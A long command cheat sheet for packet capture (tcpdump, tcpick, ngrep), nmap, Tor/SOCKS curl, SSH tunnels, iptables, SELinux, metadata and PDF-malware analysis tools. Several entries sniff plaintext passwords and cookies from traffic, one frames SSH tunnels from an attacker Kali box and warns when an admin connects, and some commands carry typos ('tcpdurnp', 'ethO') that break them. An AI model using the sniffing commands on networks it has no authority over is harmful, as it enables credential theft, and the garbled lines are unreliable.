##  [+] Capture ICMP-Echo Packets:
##-====================================================-##
## ---------------------------------------------------- ##
##   [?] -n       ## Dont resolve names
##   [?] -i any   ## listen on all intrfaces
## ---------------------------------------------------- ##
##   [?] icmp[icmptype]=icmp-echo
##        > Capture/display only icmp eho requests
## ---------------------------------------------------- ##
tcpdump -ni any icmp[icmptype]=icmp-echo
	





##-=================================================================================-##
##  [+] Dump network traffic with tcpdump to file with time-stamp in its filename
##-=================================================================================-##
date +"%Y-%m-%d_%H-%M-%Z" | xargs -I {} bash -c "sudo tcpdump -nq -s 0 -i eth0 -w ./dump-{}.pcap"








tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21



tcpdump -i ethO -XX -w $File.pcap                 ## CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE



tcpdump -i ethO port 80 dst 2.2.2.2             ## CAPTURE HTTP TRAFFIC TO 2.2.2.2





tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'      ## PRINT ALL PING RESPONSES



tcpdump -i ethO -c 50 -tttt 'udp and port 53'           ## CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP



tcpdurnp -nvvX -sO -i ethO tcp portrange 22-23          ## CAPTURE TCP TRAFFIC ON PORT 22-23



tcpdurnp -I ethO -tttt dst ip and not net 1.1.1.0/24    ## 



## SHOW CONNECTIONS TO A SPECIFIC IP

tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24



## --------------------------------------------------------- ##
##   [?] you will need to identify the Tor guard IP
## --------------------------------------------------------- ##
##   [?] you can use ss, netstat or GETINFO entry-guards 
##       through the tor controller to identify the guard IP.
## --------------------------------------------------------- ##
ss -ntp | grep "$(cat /var/run/tor/tor.pid)"


##-=======================================================-##
##  [+] use tcpdump to check for possible non-tor leaks
##-=======================================================-##
tcpdump -n -f -p -i eth0 not arp and not host IP.TO.TOR.GUARD


Capture traffic

sudo tcpdump -i mon0 -n -w $File.cap



alias httpdump="sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E \"Host\: .*|GET \/.*\""


## TCPDUMP all the data on port $1 
## into rotated files /tmp/results

tcpdump -i any -s0 tcp port "$1" -A -w /tmp/$File -C 100
  



Display a pcap file

tcpdump -r $File.pcap


Display ips and filter and sort

tcpdump -n -r $File.pcap | awk -F" " '{print $3}' | sort -u | head


Grab a packet capture on port 80

tcpdump tcp port 80 -w $File.pcap -i eth0


Check for ACK or PSH flag set in a TCP packet

tcpdump -A -n 'tcp[13] = 24' -r $File.pcap







    TCP connections

    SYN -> SYN/ACK -> ACK
    DATA -> DATA/ACK -> ACK -> ACK
    FIN -> FIN/ACK -> ACK



	

Monitor TCP traffic

tcpdump -n -tttt -i eth1 tcp




Monitor ftp traffic

tcpdump -A port ftp -v



##-====================================================-##
##  [+] Save to pcap file and display data on screen
##-====================================================-##
tcpdump -n -w - port 8080 |tee dump.pcap |tcpdump -A -r -



##-==================================-##
##  [+] Capture Packets on Port 80
##-==================================-##
tcpdump -A -s0 port 80


##-==============================-##
##  [+] Filter on UDP traffic
##-==============================-##
tcpdump -i eth0 udp
tcpdump -i eth0 proto 17




##-=========================================-##
##  [+] Capture Hosts based on IP address
##-=========================================-##
tcpdump -i eth0 host 10.10.1.1


##-===========================================================-##
##  [+] Capture only packets going one way using src or dst
##-===========================================================-##
tcpdump -i eth0 dst 10.10.1.20




##-=============================-##
##  [+] Write a capture file
##-=============================-##
tcpdump -i eth0 -s0 -w $File.pcap





##-========================================================-##
##  [+] Line Buffered Mode
## ----------------------------------------------------------- ##
##  [?] buffered (or packet buffered -C) mode
## ----------------------------------------------------------- ##
tcpdump -i eth0 -s0 -l port 80 | grep 'Server:'



##-========================================================-##
##   [+] Extract HTTP User Agent from HTTP request header
##-========================================================-##
tcpdump -nn -A -s1500 -l | grep "User-Agent:"


##-===================================================-##
##   [+]  Extract User Agent + Header From Packets:
##-===================================================-##
## ------------------------------------------------------------------- ##
##   [?] use egrep and multiple matches we can get the User Agent 
##        and the Host (or any other header) from the request.
## ------------------------------------------------------------------- ##
tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:'


##-==============================================-##
##  [+] Capture only HTTP GET and POST packets
##-==============================================-##
tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'


##-====================================-##
##    [+] Select Only on POST Requests:
##-====================================-##
## ------------------------------------------------------------------------ ##
##  [?] Match the hexadecimal GET and POST ascii Fingerprints in Packets
## ------------------------------------------------------------------------ ##
tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'


##-===================================-##
##  [+] Extract HTTP Request URLs
##-===================================-##
## ----------------------------------------------------------- ##
##  [?] Parse Host and HTTP Request location from traffic
## ----------------------------------------------------------- ##
tcpdump -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"



##-==============================================-##
##  [+] Extract HTTP Passwords in POST Requests
##-==============================================-##
tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"


##-==================================================-##
##  [+] Capture Cookies from Server and from Client
##-==================================================-##
tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:'


##-================================-##
##  [+] Capture all ICMP packets
##-================================-##
tcpdump -n icmp


##-=================================================================-##
##  [+] Show ICMP Packets that are not ECHO/REPLY (standard ping)
##-=================================================================-##
tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'


##-===================================-##
##  [+] Capture SMTP / POP3 Email
##-===================================-##
## ----------------------------------- ##
##  [?] Parse the email recipients
## ----------------------------------- ##
tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'


##-=======================================-##
##  [+] Extract NTP Query and Response
##-=======================================-##
tcpdump dst port 123


##-=======================================-##
##  [+] Capture SNMP Query and Response
##-=======================================-##
tcpdump -n -s0  port 161 and udp


##-==============================================-##
##  [+] Capture FTP Credentials and Commands
##-==============================================-##
## ______________________________________________
## ---------------------------------------------- ##
##  [?] Capture FTP Connections (TCP port 20)
## ---------------------------------------------- ##
##  [?] FTP Commands: LIST, CWD and PASSIVE
## ---------------------------------------------- ##
## ______________________________________________
## ---------------------------------------------- ##
##  [?] After the authentication is established 
##      an FTP session can be active or passive 
## ---------------------------------------------- ##
tcpdump -nn -v port ftp or ftp-data



##-=============================-##
##  [+] Rotate Capture Files
##-=============================-##
## ----------------------------------------------------------- ##
##  [?] The file capture-(hour).pcap 
##      will be created every (-G) 3600 seconds (1 hour). 
##      The files will be overwritten the following day. 
##      So you should end up with capture-{1-24}.pcap, i
## ----------------------------------------------------------- ##
tcpdump  -w /tmp/$File-%H.pcap -G 3600 -C 200



##-=================================================-##
##  [+] Capture IPv6 traffic using the ip6 filter
##-=================================================-##
tcpdump -nn ip6 proto 6


##-==================================================================-##
##  [+] Read IPv6 UDP Traffic from a previously saved capture file
##-==================================================================-##
tcpdump -nr ipv6-test.pcap ip6 proto 17



##-==============================================-##
##  [+] Test Network For Someone Running Nmap: 
##-==============================================-##
## ---------------------------------------------- ##
##  [?] Detect Port Scan in Network Traffic
## ---------------------------------------------- ##
tcpdump -nn port 80 | grep "GET /"


##-=============================================================-##
##  [+] Capture Start and End Packets of every non-local host
##-=============================================================-##
## ------------------------------------------------------------- ##
##  [?] Show each established TCP conversation with timestamps
## ------------------------------------------------------------- ##
tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'



##-=================================================-##
##  [+] Capture DNS Request and Response Packets
##-=================================================-##
## ------------------------------------------------- ##
##  [?] Outbound DNS request to Google public DNS 
##      and the A record (ip address) response
## ------------------------------------------------- ##
tcpdump -i wlp58s0 -s0 port 53


##-=================================-##
##  [+] Capture HTTP data packets
##-=================================-##
## --------------------------------------------------------------- ##
##  [?] Only capture on HTTP data packets on port 80. 
## --------------------------------------------------------------- ##
##  [?] Avoid capturing the TCP session setup (SYN / FIN / ACK)
## --------------------------------------------------------------- ##
tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'



##-==================================================-##
##  [+] Capture with tcpdump and view in Wireshark
##-==================================================-##
'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -



##-========================================-##
##  [+] Capture Top Hosts by Packets
##-========================================-##
## ---------------------------------------- ##
##  [?] List the top number of packets 
##  [?] Extract the IP address
##  [?] Sort and count the occurrances
## ---------------------------------------- ##
tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20



##-===========================================-##
##  [+] Capture all the plaintext passwords
##-===========================================-##
## -------------------------------------------------------- ##
##  [?] capture passwords (hostname, ip address, system)
## -------------------------------------------------------- ##
tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '



##-========================================-##
##  [+] Capture DHCP Request And Replies:
##-========================================-##
## ---------------------------------------------------------------- ##
##  [?] DHCP requests are seen on port 67 and the reply is on 68.
## ---------------------------------------------------------------- ##
tcpdump -v -n port 67 or 68



##-========================================-##
##  [+] record the capture data to a file.
##-======================================-##
tcpdump -i eth0 udp port 53 -w $File.pcap



##-========================================-##
##  [+] read the results of the capture.
##-======================================-##
tcpdump -n -t -r $File.pcap port 53




tcpdump -i any -s0 -w $File.pcap
tcpdump -i eth0 -w $File -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X






##-========================================-##
##  [+] 
##-======================================-##
tcpdump -i wlan0 -vvv -A | grep "GET"




##-========================================-##
##  [+] This will grep all GET from the wlan0 interface. 
##       This will not get any SSL-encrypted traffic.
##-======================================-##
sudo tcpdump -i wlan0 src port 80 or dst port 80 -w port-80-recording.pcap
sudo tcpdump -i eth0 src port 80 or dst port 80 -w port-80-recording.pcap



##-========================================-##
##  [+] Print the traffic in hex with ascii interpretation.
##-======================================-##
tcpdump -nX -r file.pcap



##-========================================-##
##  [+] Only record tcp-traffic
##-======================================-##
tcpdump tcp -w file.pcap




##-===============================-##
##  [+] Dump Packets By Domain
##-===============================-##
tcpdump -i eth0 -nt -s 500 port domain


##-======================================-##
##  [+] Filter By Domain Using Regex:
##-======================================-##
tcpdump -i eth0 -nt port 53 | grep $DomainDNS



#!/bin/bash
IP=$3
PWD=`pwd`
LOG_FILE="${PWD}/../logs/active-responses.log"
[ "x${IP}" = "x" ] && exit 1
echo "`date` $0 $1 $2 $3 $4 $5" >> ${LOG_FILE}
tcpdump -i any -s 0 -G 600 -W 1 -w /var/tmp/tcpdump-$IP-%Y%m%d%H%M.pcap src host $IP or dst host $IP




##-======================================-##
##  [+] Password Sniffing
##-======================================-##
tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-




##-======================================-##
##  [+] Monitor all new TCP connections
##-======================================-##
tcpdump -n "tcp[tcpflags] == tcp-syn"



##-======================================-##
##  [+] Alert on new TCP connections
##-======================================-##
Make a bing-noise (ascii BEL) 
when anyone tries to SSH to/from 
the target system (could be an admin!).

tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done





CAPTURE TRAFFIC FOR <SEC> SECONDS

durnpcap -I ethO -a duration: sec -w file file.pcap


Examining Records With tcpshow:

tcpdump –r tcpdumpfile –enx ‘dst port 31789’ | tcpshow -nolink





SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2

socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80







##-======================================-##
##  [+] 
##-======================================-##
tshark -f "tcp port 80" -i eth0


##-======================================-##
##  [+] 
##-======================================-##
dsniff -m




##-======================================-##
##  [+] CAPTURE TRAFFIC FOR <SEC> SECONDS
##-======================================-##
durnpcap -I ethO -a duration: sec -w file file.pcap


##-======================================-##
##  [+] REPLAY PCAP
##-======================================-##
file2cable -i ethO -f file.pcap



##-======================================-##
##  [+] 
##-======================================-##
tcpreplay --topspeed --loop=O --intf=ethO $PCAP -- mbps=10|100|1000




## ==================================================================================== ##
		tcpick -i eth0 -C										## display the connection status:
## ==================================================================================== ##
		tcpick -i eth0 -C -yP -h -a						## display the payload and packet headers:
## ==================================================================================== ##
		tcpick -i eth0 -C -bCU -T1 "port 25"        ## display client data only of the first smtp connection:
## ==================================================================================== ##
		tcpick -i eth0 -wR "port ftp-data"			## download a file passively:
## ==================================================================================== ##
		tcpick -a													## Displays host names instead of IPs
## ==================================================================================== ##
		tcpick -v5													## Verbose Lvl 1-5
## ==================================================================================== ##


## ==================================================================================== ##
		tcpick   -i   eth0   --pipe  client  "port  80"  |  gzip  > http_response.gz
## ==================================================================================== ##
		tcpick -i eth0 --pipe server "port 25" | nc foobar.net 25
## ==================================================================================== ##


## ----------------------------------------- ##
##    [+] Monitoring requests
## ----------------------------------------- ##
sudo tcpflow -p -c -i eth0 port 80 | grep -oE '(GET|POST|HEAD) .* HTTP/1.[01]|Host: .*'



##-=================================================-##
##  [+] process all of the pcap files in the current directory
##-=================================================-##
tcpflow -o out -a -l *.pcap




##-==================================-##
##  [+] Match packets with the following:
##-==================================-##
##      -------------------------------
##      		  POST (^*) 							## at the start of the line 
##      ------------- or --------------
##            HTTP POST requests
##      -------------------------------
##      in a simple text output format. 
##-=================================-##
ngrep -d wlan0 '^POST'


## -------------------------------------------------------------------- ##
##  [?] String 'pwd' has shown the HTTP POST
##         request with my login and password
## -------------------------------------------------------------------- ##
ngrep -t -d wlan0 'pwd'


##-======================================-##
##  [+] 
##-======================================-##
ngrep -q -W byline "GET|POST HTTP"


## --------------------------------------------------------------- ##
##     [?] tcpflow will log all the tcpflows
##     [?] or TCP sessions into text files
## --------------------------------------------------------------- ##

##-===========================================-##
##  [+] Capture all HTTP flows over port 80 
##      and store them as text files
##-===========================================-##
tcpflow -i wlan0 'port 80'


echo -e "\t<<+}===== converting the hostname to an IPv4 address using DNS: ====={+>>"
nmap --dns-servers 8.8.8.8,8.8.4.4 scanme.nmap.org




Scan a subnet
nmap 127.0.0.0.0/24

Scan targets from a text file
nmap -iL list-of-ips.txt




Find Information about IP address
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24


##  Append extra random data to change default packet lengths
–data-length 15


Randomize scan order
-randomize-hosts




# perform a geolocation traceroute to determin where in the world
# your target server lives, and what hops it might need to get there
#   - replace -p with the port you would like to target if not http server
nmap --traceroute --script traceroute-geolocation -p 80 $TARGET_IP

# perform a bruteforce dns subdomain guess attack enumerating common subdomains
#   -sn: Don't port scan
#   -Pn: Don't ping scan
nmap -sn -Pn --script dns-brute $TARGET_IP



##-======================================-##
##  [+] 
##-======================================-##
tshark -i $1 -T fields -e ip.src -e ip.dst -e frame.protocols -E header=y










##-=============================-##
##  [+] Recursively Download Files
##-=============================-##
wget -r -l 3 -k -p -H https://


##-=================================================-##
##   [+] Recursively fetch list of URLs with wget:
##-=================================================-##
cat url-list.txt | xargs wget ???c


Parallel file downloading with wget

wget -nv http://en.wikipedia.org/wiki/Linux -O- | egrep -o "http://[^[:space:]]*.jpg" | xargs -P 10 -r -n 1 wget -nv


##-==========================================-##
##     [+] Find out all the jpg images and archive it.
##-==========================================-##
find / -name *.jpg -type f -print | xargs tar -cvzf images.tar.gz


##-==========================================-##
##     [+] Copy all the images to an external hard-drive.
##-==========================================-##
ls *.jpg | xargs -n1 -i cp {} /external-hard?drive/directory




##-======================================================================================================================================-##
##  ||----------------------------------------------->> Clearnet access via HTTP/SOCKS <<---------------------------------------------||
##-======================================================================================================================================-##
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI -x 127.0.0.1:8118 ${webhost}									## Fetch via HTTP proxy as root
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${webhost}					## Fetch via HTTP proxy as anon
    curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}					## Fetch via SOCKS proxy as root
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}	## Fetch via SOCKS proxy as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    curl -fsSI --socks5 127.0.0.1:9050 ${webhost}							## Fetch via SOCKS proxy w/ local DNS as root
    sudo -n -u anon curl -fsSI --socks5 127.0.0.1:9050 ${webhost}			## Fetch via SOCKS proxy w/ local DNS as anon
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

##-======================================================================================================================================-##
##  ||---------------------------------------->> Fetch Over SOCKS5 Using Privoxy And Local DNS <<-------------------------------------||
##-======================================================================================================================================-##
## 
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via privoxy
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
    sudo -n -u privoxy curl -fsSI --socks5-hostname 127.0.0.1:9050 ${webhost}		## Fetch via SOCKS5 proxy as privoxy 
    sudo -n -u privoxy curl -fsSI --socks5 127.0.0.1:9050 ${webhost}				## Fetch via SOCKS5 proxy w/ local DNS as privoxy
## -------------------------------------------------------------------------------------------------------------------------------------- ##
##-======================================================================================================================================-##

##-======================================================================================================================================-##
##  ||----------------------------------------------->> Darknet access via HTTP/SOCKS <<----------------------------------------------||
##-======================================================================================================================================-##
    sudo -n -u anon curl -fsSI -x 127.0.0.1:8118 ${onionhost}						## Fetch via .onion via HTTP proxy as anon
    sudo -n -u anon curl -fsSI --socks5-hostname 127.0.0.1:9050 ${onionhost}		## Fetch .onion via SOCKS proxy as anon
##-======================================================================================================================================-##




curl --socks5-hostname 127.0.0.1:9050 -o $File $URL


Use SOCKS proxy to upload over SSH:

curl --upload-file $1 --socks5-hostname CONDUITHOST:1080 http://config/package/




/etc/ssh/sshd_config

echo 'AddressFamily inet' | sudo tee -a /etc/ssh/sshd_config





## created an RSA key-pair
ssh-keygen -b 4096


mkdir -p ~/.ssh && sudo chmod -R 700 ~/.ssh/

ls ~/.ssh/id_rsa*



ssh-copy-id example_user@203.0.113.10


scp ~/.ssh/id_rsa.pub example_user@203.0.113.10:~/.ssh/authorized_keys


sudo chmod 700 -R ~/.ssh && chmod 600 ~/.ssh/authorized_keys


sudo systemctl restart sshd
sudo service ssh restart





##   [+] SSH Tunneling

# Local Tunnel
Kali> ssh $ATTACKER -L 3000:$TARGET:2222

# Remote Tunnel
Kali> ssh $TARGET -R 2222:localhost:3000

# Dynamic Tunnel to $TARGET
Kali> ssh -D 127.0.0.1:3000 -N username@$TARGET



Overwrites remote file without asking! 
Uses HTTPS proxy that supports CONNECT. 
Actually uses SSH and not SFTP to upload the file.


cat myFile.json | ssh root@remoteSftpServer -o "ProxyCommand=nc.openbsd -X connect -x proxyhost:proxyport %h %p" 'cat > myFile.json'





/etc/iptables/ipv4
:   ~~~ conf
    *filter

    # Allow all loopback (lo0) traffic and reject traffic
    # to localhost that does not originate from lo0.
    -A INPUT -i lo -j ACCEPT
    -A INPUT ! -i lo -s 127.0.0.0/8 -j REJECT

    # Allow ping.
    -A INPUT -p icmp -m state --state NEW --icmp-type 8 -j ACCEPT

    # Allow SSH connections.
    -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT

    # Allow HTTP and HTTPS connections from anywhere
    # (the normal ports for web servers).
    -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
    -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT

    # Allow inbound traffic from established connections.
    # This includes ICMP error returns.
    -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

    # Log what was incoming but denied (optional but useful).
    -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables_INPUT_denied: " --log-level 7

    # Reject all other inbound.
    -A INPUT -j REJECT

    # Log any traffic that was sent to you
    # for forwarding (optional but useful).
    -A FORWARD -m limit --limit 5/min -j LOG --log-prefix "iptables_FORWARD_denied: " --log-level 7

    # Reject all traffic forwarding.
    -A FORWARD -j REJECT

    COMMIT
    ~~~




-A INPUT -s longview.linode.com -m state --state NEW -j ACCEPT



-A INPUT -s 193.138.219.228 -m state --state NEW -j ACCEPT

193.138.219.228



echo "[+] Block all FaceBook traffic"
ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo " blocking $s"; sudo iptables -A INPUT -s $s -j REJECT &> /dev/null || sudo ip6tables -A INPUT -s $s -j REJECT; done




echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )' | grep -Po '([0-9a-z:.]*)(?=:http[s])' | sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


/etc/iptables/iptables.rules
/etc/iptables/ip6tables.rules

sudo iptables-restore < /etc/iptables/iptables.rules
sudo ip6tables-restore < /etc/iptables/ip6tables.rules

sudo systemctl start iptables && sudo systemctl start ip6tables
sudo systemctl enable iptables && sudo systemctl enable ip6tables





sudo iptables-restore < /tmp/v4
sudo ip6tables-restore < /tmp/v6

sudo service iptables save
sudo service ip6tables save


iptables -vL
ip6tables -vL

iptables -L --line-numbers






ssh -D 12345 user@host.domain               ## tells SSH to run the SOCKS server on port 12345









id -Z
unconfined_u:unconfined_r:unconfined_t


sestatus | grep "Loaded policy"

sestatus | grep mode

## Switch to the permissive mode
setenforce 0
echo 0 > /sys/fs/selinux/enforce


setsebool -P secure_mode_policyload on

semanage permissive -l

semanage user -l


##  [+]  chcat utility can be used to assign categories to users
chcat -L


stat dokuwiki | grep Context
Context: system_u:object_r:httpd_sys_rw_content_t


semanage fcontext -l



/.*                         system_u:object_r:default_t
/usr/.*                     system_u:object_r:usr_t
/usr/(.*/)?lib(/.*)?        system_u:object_r:lib_t

chcon -R -t httpd_sys_content_t /srv/www


## semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"
## restorecon -R /srv/www

semanage fcontext -l | grep admin_home_t


Quicker test:
              unhide quick

       Quick test:
              unhide quick reverse

       Standard test:
              unhide sys proc

       Deeper test:
              unhide -m -d sys procall brute reverse




ausearch -m avc -ts recent



tcontext=system_u:object_r:mount_var_run_t:s0

scontext=system_u:system_r:dnsmasq_t
tcontext=system_u:object_r:sysctl_net_t




seinfo | grep -E '(dontaudit|allow)'

ausearch –m avc –ts today | audit2why

scanelf -n /bin/ls



grep ^SELINUX= /etc/selinux/config
SELINUX=enforcing

/etc/selinux/semanage.conf

cat /sys/fs/selinux/mls
sestatus | grep MLS

sestatus | grep deny_unknown

/etc/selinux/targeted/modules/active


/etc/selinux/targeted/policy
/etc/selinux/strict/policy





##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##




Find Information about IP address
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24



##-============================================================================-##
##  [+] Generate a Google maps URL for GPS location data from digital photo
##-============================================================================-##
echo "https://www.google.com/maps/place/$(exiftool -ee -p '$gpslatitude, $gpslongitude' -c '%d?%d'%.2f"\" image.jpg 2> /dev/null | sed -e "s/ //g")





##-=======================================================-##
##   [+] Extract jpeg files with the Exif magic bytes.
##-=======================================================-##
jpegtran -copy all -outfile "$1"



hachoir-metadata pacte_des_gnous.avi
hachoir-metadata Archive.zip 
Mutagen




exiftool -exif:all								## display all exif tags for the selected images
exiftool -exif:all=								## remove(!) all exif tags from the selected images
exiftool -Exif:Artist="Xe1phix"		## put "Your Name" into the selected images


exiftool -a -u -g1 $file > $exifoutput.txt


## Generate output ".txt" files with detailed meta information.
exiftool -k -a -u -g1 -w $OutFile.txt $File



exiftool -geotag $File.gpx '-geotime<${DateTimeOriginal}-06:00' *.jpg





## ---------------------------------------------------------- ##
##     [?] Copies audio stream metadata 
##     [?] From in0.mkv to $OutFile.mkv
## ---------------------------------------------------------- ##
-map_metadata:s:a 0:s:a $OutFile.mkv


## --------------------------------------------------------------------------------------- ##
##    [?] copies all global metadata from in0.mkv to out.mkv  
## --------------------------------------------------------------------------------------- ##
ffmpeg -i $File.mkv -i $File.mkv -map 1 -c copy 




ffmpeg -i $File.mkv -i $File.mkv -map 1 -c copy -map_metadata:s:a 0:s:a $OutFile.mkv



ffprobe -v error -select_streams v:0 -show_format 

ffprobe -v debug -select_streams v:0 -show_streams 




sox $File.wav -n stat 2>&1 | sed -n 's#^Length (seconds):[^0-9]*([0-9.]*)$#1#p'

dump $File.swf $File.png
 
dump -i $File.swf -uml 




##-==============================-##
##  [+] 
##-==============================-##
hachoir-metadata --level=9


hachoir-metadata --parser-list
hachoir-metadata --verbose
hachoir-metadata --debug
hachoir-metadata --log=



## -------------------------------------------------- ##
##   [?] 
## -------------------------------------------------- ##




##-==========================-##
##  [+] Search JPEG images:
##-==========================-##
hachoir-subfile input --parser=jpeg $File


##-=======================-##
##   [+] Search images:
##-=======================-##
hachoir-subfile input --category=image $File


##-===========================================-##
##  [+] Search images, videos and SWF files:
##-===========================================-##
hachoir-subfile input --category=image,video --parser=swf


##-====================================-##
##   [+] Search all subfiles 
##   [+] store them in /$Dir/
##-====================================-##
hachoir-subfile input /$Dir/


##-==============================-##
##  [+] Find files in a hard drive:
##-==============================-##
hachoir-subfile /dev/sda --size=34200100 --quiet


##-==============================-##
##  [+] 
##-==============================-##
hachoir-strip --strip=useless 
hachoir-strip --strip=metadata
hachoir-strip --strip="useless,metadata"


##-==============================-##
##  [+] 
##-==============================-##
pdfxray_lite -f $File.pdf -r rpt_


##-==============================-##
##  [+] 
##-==============================-##
pdfextract $File.pdf



## -------------------------------------------------- ##
##   [?] 
## -------------------------------------------------- ##



base64 -d stream_122.dmp > decoded_file
base64 -d stream_122.dmp > decoded_file
xxd decoded_file | less


##-==========================-##
##   [+] interactive Mode
##-==========================-##
peepdf -i $File.pdf



##-==========================-##
##   [+] 
##-==========================-##
peepdf --check-vt $File.pdf



##-===================================-##
##   [+] Sets loose parsing mode
##-===================================-##
## ----------------------------------- ##
##   [?] to catch malformed objects
## ----------------------------------- ##

peepdf --loose-mode $File.pdf


##-==============================================-##
##   [+] Avoids automatic Javascript analysis
##-==============================================-##
## -------------------------------------------------- ##
##   [?] Useful with eternal loops (heap spraying)
## -------------------------------------------------- ##
peepdf --manual-analysis $File.pdf


## -------------------------------------------------- ##
##   [?] 
## -------------------------------------------------- ##





##-===========================-##
##   [+] Extract references:
##-===========================-##
pdf-extract extract --references $File.pdf


##-========================================-##
##   [+] Extract references and a title:
##-========================================-##
pdf-extract extract --references --titles $File.pdf


##-======================================-##
##  [+] Mark the locations of 
##  [+] Headers, Footers and Columns:
##-======================================-##
pdf-extract mark --columns --headers --footers $File.pdf


##-==========================================-##
##  [+] Extract regions of text from a PDF
##  [?] Preserving line information 
##-==========================================-##
## ------------------------------------------ ##
##    [?] (offsets from region origin):
## ------------------------------------------ ##
pdf-extract extract --regions $File.pdf


##-==========================================-##
##  [+] Extract regions of text from a PDF 
##  [+] without line information 
##-==========================================-##
## ------------------------------------------ ##
##   [?] (prettier and easier to read):
## ------------------------------------------ ##
pdf-extract extract --regions --no-lines $File.pdf


##-=========================================-##
##  [+] Resolve references to DOIs
##  [+] output related metadata as BibTeX:
##-=========================================-##
pdf-extract extract-bib --resolved_references $File.pdf




##-========================================-##
##  [+] pdfinfo - PDF document extractor
##-========================================-##
## ----------------------------------------------------- ##
##   -meta			Prints doc level metadata
##   -js			Prints all JavaScript in PDF
##   -rawdates		Prints raw undecoded date strings
##   -dests 		Print list of all destinations
## ----------------------------------------------------- ##
pdfinfo -box -meta -js -rawdates $File.pdf



##-============================================-##
##   [+] Display objects + actions structure
##-============================================-##
pdfdid.py -aefv $File.pdf



## ------------------------------------------------- ##
##   [?] Search for:
## ------------------------------------------------- ##
##   [+] /OpenAction 
##   [+] /AA 
##   [+] /Launch 
##   [+] /GoTo 
##   [+] /GoToR 
##   [+] /SubmitForm  
##   [+] /Richmedia (for Flash) 
##   [+] /JS 
##   [+] /JavaScript 
##   [+] /URI
## ------------------------------------------------- ##
##   [?] Encoding
##   [+] Cipher
##   [+] Shell code
##   [+] Obfuscation
## ------------------------------------------------- ##


##-=====================================-##
##   [+] Automatically with ParanoiDF
##-=====================================-##
paranoiDF.py -fl $File.pdf


##-======================================-##
##   [+] Display Malformed PDF Elements
##-=======================================-##
pdf-parser -v $File.pdf



## ---------------------------------------------------------------------- ##
	peepdf.py -fl $File.pdf         ## Examine PDF for risky tags 
								    ## And Malformed objects.
## ---------------------------------------------------------------------- ##
	pdfid $File.pdf                 ## Scan for risky keywords
								    ## And Flagged entries.
## ---------------------------------------------------------------------- ##
	pdfid --scan $File.pdf			## Scan Directory
## ---------------------------------------------------------------------- ##
	pdfid --disarm $File.pdf		## Disable JavaScript + autolaunch
## ---------------------------------------------------------------------- ##
	pdfid --verbose $File.pdf       ## Verbose (raises catched exceptions)
## ---------------------------------------------------------------------- ##
	pdfid --output=$File			## Output to log file
